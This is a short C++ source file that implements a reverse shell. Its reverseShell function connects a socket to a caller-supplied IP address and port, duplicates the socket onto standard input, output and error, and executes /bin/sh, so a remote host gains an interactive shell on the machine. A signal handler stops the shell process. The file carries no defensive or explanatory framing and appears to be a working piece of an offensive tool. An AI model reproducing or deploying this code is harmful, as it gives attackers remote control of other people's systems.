#include <stdio.h>
#include <string>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "params.h"
#include <signal.h>

pid_t pid;
void shellSigHandler(int sig_num) {

        signal(SIGINT, shellSigHandler);
        printf("Stopping shell\n");
	kill(pid, SIGTERM);

}

void *reverseShell(void* voidArgs)
{
	signal(SIGINT, shellSigHandler);
	parameters *args = (parameters*)voidArgs;
        int port;
        std::string ip;

        port = args->port;
        ip = args->ip;

	struct sockaddr_in sa;
	int s;

	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(ip.c_str());
	sa.sin_port = htons(port);

	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr *)&sa, sizeof(sa));
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);

	execve("/bin/sh", 0, 0);
	return NULL;
}
